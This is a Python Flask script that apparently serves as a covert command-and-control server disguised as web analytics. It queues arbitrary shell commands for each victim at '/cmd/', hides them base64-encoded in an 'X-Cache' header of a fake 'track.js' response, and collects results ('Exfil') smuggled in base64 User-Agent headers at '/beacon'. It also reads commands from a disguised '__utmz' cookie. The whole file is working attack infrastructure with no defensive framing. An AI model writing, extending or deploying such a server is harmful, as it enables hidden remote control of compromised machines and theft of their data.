from flask import Flask, request, Response
import base64, subprocess

app = Flask(__name__)
PENDING_CMD = {}
RESULTS = {}

@app.route('/track.js')
def checkin():
    vid = request.headers.get('X-Session-Token', 'unknown')
    
    # Decode command từ Cookie nếu có
    cookie_cmd = request.cookies.get('__utmz')
    if cookie_cmd:
        try:
            cmd = base64.b64decode(cookie_cmd).decode()
            print(f"[T2] Received cmd from {vid}: {cmd}")
        except: pass

    cmd = PENDING_CMD.pop(vid, None)
    resp = Response("console.log(1);", mimetype='application/javascript')
    
    if cmd:
        # Nhúng lệnh vào X-Cache header (stego)
        resp.headers['X-Cache'] = base64.b64encode(cmd.encode()).decode()
    return resp

@app.route('/beacon', methods=['POST'])
def result():
    vid = request.headers.get('X-Session-Token', 'unknown')
    # Output được nhúng trong User-Agent (base64)
    raw = request.headers.get('User-Agent', '')
    try:
        out = base64.b64decode(raw).decode()
        RESULTS[vid] = out
        print(f"[T2] Exfil from {vid}:\n{out}")
    except: pass
    return 'OK'

@app.route('/cmd/<vid>/<path:cmd>')
def set_cmd(vid, cmd):
    PENDING_CMD[vid] = cmd
    return 'OK'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
                                          
